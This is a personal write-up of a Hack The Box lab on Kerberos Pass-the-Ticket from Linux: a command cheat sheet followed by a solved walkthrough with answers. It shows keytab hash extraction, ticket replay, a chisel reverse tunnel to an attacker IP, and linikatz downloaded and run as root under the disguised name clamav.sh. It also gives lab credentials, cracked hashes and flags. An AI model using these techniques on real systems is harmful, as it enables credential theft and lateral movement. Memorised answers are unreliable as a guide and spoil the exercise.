### CPTS / HTB Penetration Tester Path <br>
### Password Attacks - Pass the Ticket (PtT) from Linux <br>
<mark>hook it up with a &#x2B50; if this helps.</mark> <br>
🐦: @<a href="https://x.com/st8less">**st8less**</a>

<br>
<br>

---

### Pass the Ticket (PtT) from Linux



Linux can join AD via Kerberos (sssd, samba, FreeIPA). Tickets stored as ccache files; long-term keys in keytab files.

| Storage | Location | Format |
|---|---|---|
| Active ticket cache | `/tmp/krb5cc_*` (path in `KRB5CCNAME`) | binary ccache |
| Long-term keys | `*.keytab` files | encrypted principal/key pairs |

#### Identify domain integration

```diff
+ $ realm list
+ $ ps -ef | grep -i "winbind\|sssd"
```

<br>

#### Find keytabs

```diff
+ $ find / -name *keytab* -ls 2>/dev/null
```

<br>

Inspect keytab contents:

```diff
+ $ klist -k -t /path/to/file.keytab
```

<br>

#### Authenticate using a keytab — creates ccache

```diff
+ $ kinit <user>@<REALM> -k -t /path/to/file.keytab
+ $ klist
```

<br>

Use ticket against SMB share:

```diff
+ $ smbclient //<target>/<share> -k -c ls
```

<br>

#### Extract hashes from a keytab

```diff
+ $ python3 /opt/keytabextract.py /path/to/file.keytab
```

<br>

Returns NTLM (RC4-HMAC), AES-256, AES-128 hashes.

#### Replay an existing ccache (PtT)

```diff
+ $ export KRB5CCNAME=/path/to/krb5cc_xxx
+ $ klist
+ $ smbclient //<target>/<share> -k
```

<br>

#### Pivot Kerberos through proxychains (chisel + impacket)

`/etc/hosts`:

```diff
+ <DC-ip>  dc01.inlanefreight.htb dc01
```

<br>

`/etc/proxychains.conf`:

```diff
+ socks5 127.0.0.1 1080
```

<br>

Chisel reverse tunnel:

```diff
+ $ sudo ./chisel server --reverse
+ C:\> chisel.exe client <attacker-ip>:8080 R:socks
```

<br>

Then impacket / evil-winrm via proxychains:

```diff
+ $ proxychains impacket-wmiexec dc01 -k -no-pass
+ $ proxychains evil-winrm -i dc01 -r inlanefreight.htb
```

<br>

#### Cross-platform ticket conversion

```diff
+ $ impacket-ticketConverter krb5cc_xxx julio.kirbi
+ C:\tools> Rubeus.exe ptt /ticket:c:\tools\julio.kirbi
```

<br>

#### Linikatz — extract every cached AD credential (root)

```diff
+ $ wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
+ $ chmod +x linikatz.sh
+ $ sudo ./linikatz.sh
```

<br>

---

<br>

### Exercise

IP: 10.129.243.71 — SSH (port 2222) as `david@inlanefreight.htb` / `Password2`.

---

### Question 1:
Connect to the target machine using SSH to the port TCP/2222 and the provided credentials. Read the flag in David's home directory.

```diff
+ $ ssh david@inlanefreight.htb@10.129.204.23 -p 2222
+ david@inlanefreight.htb@linux01:~$ cat flag.txt
```

	Gett1ng_Acc3$$_to_LINUX01

&#x1F6A9; found `Gett1ng_Acc3--edit--$$_to_LINUX01`.

---

### Question 2:
Which group can connect to LINUX01?

```diff
+ david@inlanefreight.htb@linux01:~$ realm list
```

	permitted-logins: david@inlanefreight.htb, julio@inlanefreight.htb
	permitted-groups: Linux Admins

&#x1F6A9; found **Linux Admins**.

---

### Question 3:
Look for a keytab file that you have read and write access. Submit the file name as a response.

```diff
+ david@inlanefreight.htb@linux01:~$ find / -name *keytab* -ls 2>/dev/null
```

	-rw-rw-rw- /opt/specialfiles/carlos.keytab

&#x1F6A9; found **carlos.keytab**.

---

### Question 4:
Extract the hashes from the keytab file you found, crack the password, log in as the user and submit the flag in the user's home directory.

```diff
+ $ python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab
```

	REALM : INLANEFREIGHT.HTB
	SERVICE PRINCIPAL : carlos/
	NTLM HASH : a738f92b3c08b424ec2d99589a9cce60

#### Submitted the NT hash to crackstation.net — already cracked. SSH as carlos:

```diff
+ $ ssh carlos@inlanefreight.htb@10.129.243.71 -p 2222
+ carlos@inlanefreight.htb@linux01:~$ cat flag.txt
```

	C@rl0s_1$_H3r3

&#x1F6A9; found `C@rl0s--edit--_1$_H3r3`.

---

### Question 5:
Check Carlos' crontab, and look for keytabs to which Carlos has access. Try to get the credentials of the user svc_workstations and use them to authenticate via SSH. Submit the flag.txt in svc_workstations' home directory.

```diff
+ carlos@inlanefreight.htb@linux01:~$ crontab -l
```

	*/5 * * * * /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh

<br>

```diff
+ carlos@inlanefreight.htb@linux01:~$ cat /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh
```

	kinit svc_workstations@INLANEFREIGHT.HTB -k -t /home/carlos@inlanefreight.htb/.scripts/svc_workstations.kt

<br>

`svc_workstations.kt` only has AES-256 — no NTLM. Look at the dir for siblings:

```diff
+ carlos@inlanefreight.htb@linux01:~/.scripts$ ls -la
```

	-rw------- 1 carlos ... 246 Oct 23 23:35 svc_workstations._all.kt

<br>

Extract from the `_all.kt`:

```diff
+ $ python3 /opt/keytabextract.py /home/carlos@inlanefreight.htb/.scripts/svc_workstations._all.kt
```

	NTLM HASH : 7247e8d4387e76996ff3f18a34316fdd

<br>

Crackstation cracked it → SSH as the service account, read flag.

&#x1F6A9; found `Mor3_4cce$$--edit--_m0r3_Pr1v$`.

---

### Question 6:
Check the sudo privileges of the svc_workstations user and get access as root. Submit the flag in /root/flag.txt directory as the response.

```diff
+ svc_workstations@inlanefreight.htb@linux01:~$ sudo -l
```

	(ALL) ALL

<br>

```diff
+ svc_workstations@inlanefreight.htb@linux01:~$ sudo su
+ root@linux01:/# cat /root/flag.txt
```

	Ro0t_Pwn_K3yT4b

&#x1F6A9; found **Ro0t_Pwn--edit--_K3yT4b**.

---

### Question 7:
Check the /tmp directory and find Julio's Kerberos ticket (ccache file). Import the ticket and read the contents of julio.txt from the domain share folder \\DC01\julio.

```diff
+ root@linux01:/tmp# ls -la
```

	-rw------- 1 julio@inlanefreight.htb ... 183 Oct 23 22:55 krb5cc_647401106_bVcIT9

<br>

Copy + import:

```diff
+ root@linux01:/tmp# cp /tmp/krb5cc_647401106_bVcIT9 /opt
+ root@linux01:/opt# export KRB5CCNAME=/opt/krb5cc_647401106_bVcIT9
+ root@linux01:/opt# smbclient \\\\DC01\\julio -k
+ smb: \> get julio.txt
+ smb: \> exit
+ root@linux01:~# cat julio.txt
```

	JuL1()_SH@re_fl@g

&#x1F6A9; found **JuL1()_SH--edit--@re_fl@g**.

---

### Question 8:
Use the LINUX01$ Kerberos ticket to read the flag found in \\DC01\linux01. Submit the contents as your response (the flag starts with Us1nG_).

Linikatz finds the machine ticket cached by sssd:

```diff
+ $ git clone https://github.com/CiscoCXSecurity/linikatz.git
+ $ python3 -m http.server 4445
+ root@linux01:~# curl http://10.10.15.222:4445/linikatz.sh -o clamav.sh
+ root@linux01:~# chmod +x clamav.sh && ./clamav.sh
```

	-rw------- 1 root root 4154 Oct 25  2022 /var/lib/sss/db/ccache_INLANEFREIGHT.HTB

<br>

Use the LINUX01$ ticket:

```diff
+ root@linux01:~# cp /var/lib/sss/db/ccache_INLANEFREIGHT.HTB /root
+ root@linux01:~# export KRB5CCNAME=/root/ccache_INLANEFREIGHT.HTB
+ root@linux01:~# klist
```

	Default principal: LINUX01$@INLANEFREIGHT.HTB

<br>

```diff
+ root@linux01:~# smbclient //DC01/linux01 -k
+ smb: \> get flag.txt
+ root@linux01:~# cat flag.txt
```

	Us1nG_KeyTab_Like_@_PRO

&#x1F6A9; found **Us1nG_KeyTab--edit--_Like_@_PRO**.
